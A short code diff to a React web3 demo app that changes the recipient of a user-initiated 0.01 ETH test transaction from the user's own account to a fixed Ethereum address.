@@ -227,7 +227,7 @@ class App extends React.Component {
 
   sendEth = () => {
     const { account } = this.state
-    web3Obj.web3.eth.sendTransaction({ from: account, to: account, value: web3Obj.web3.utils.toWei('0.01') })
+    web3Obj.web3.eth.sendTransaction({ from: account, to: '0xadD2292217dA6B0D93c3b204De770842bDF77198', value: web3Obj.web3.utils.toWei('0.01') })
   }
 
   sendDai = () => {
